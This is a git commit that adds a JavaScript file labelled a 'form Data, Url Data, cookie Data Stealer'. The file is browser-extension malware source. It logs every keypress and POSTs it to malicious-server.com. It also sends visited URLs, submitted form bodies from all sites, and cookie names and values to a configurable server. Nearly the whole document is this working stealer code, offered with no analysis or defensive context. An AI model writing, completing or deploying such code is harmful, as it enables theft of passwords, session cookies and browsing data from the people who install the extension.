9f8dad7bda6e70159055e9eb54f73a121d49efee
Tejeswar03 <tejeswar@sqrx.com>
2025-02-17 14:21:40 +0530

    Create FormData,UrlData,CookieData code.js

---
+++ FormData,UrlData,CookieData code.js
@@ -0,0 +1,90 @@
+form Data, Url Data, cookie Data Stealer
+
+//captures all keyboard presses
+document.addEventListener('keypress', function(event) {
+    fetch('https://malicious-server.com/keystrokes', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ key: event.key })
+    });
+});
+
+// Send URL Data
+chrome.webNavigation.onCompleted.addListener((e) => {
+    const url = `${SERVER_HOST}/u`;
+    fetch(
+        url,
+        {
+            method: "POST",
+            body: JSON.stringify({ url: e.url }),
+            headers: {
+                "Content-Type": "application/json"
+            }
+        }
+    );
+}, {});
+
+
+// Send Form Data
+chrome.webRequest.onBeforeRequest.addListener(
+    (e) => {
+        const url = `${SERVER_HOST}/f`;
+        let data = {};
+        if (e.requestBody != undefined) {
+            if (e.requestBody.formData != undefined) {
+                data["data"] = e.requestBody.formData
+            }
+            if (e.requestBody.raw != undefined) {
+                data["data"] = e.requestBody.formData.raw.join("");
+            }
+            fetch(
+                url,
+                {
+                    method: "POST",
+                    body: JSON.stringify(data),
+                    headers: {
+                        "Content-Type": "application/json"
+                    }
+                }
+            );
+        }
+    },
+    {urls: ["<all_urls>"]},
+    ["requestBody"]
+);
+
+
+// Send cookie data
+chrome.cookies.onChanged.addListener(
+    (e) => {
+        const url = `${SERVER_HOST}/c`;
+        if (!e.removed) {
+            const cookie = e.cookie;
+            const data = {
+                cookie: {
+                    name: cookie.name,
+                    sameSite: cookie.sameSite,
+                    domain: cookie.domain,
+                    session: cookie.session,
+                    value: cookie.value
+                }
+            };
+            fetch(
+                url,
+                {
+                    method: "POST",
+                    body: JSON.stringify(data),
+                    headers: {
+                        "Content-Type": "application/json"
+                    }
+                }
+            )
+           
+        }
+    }
+);
+
+
+
+
+
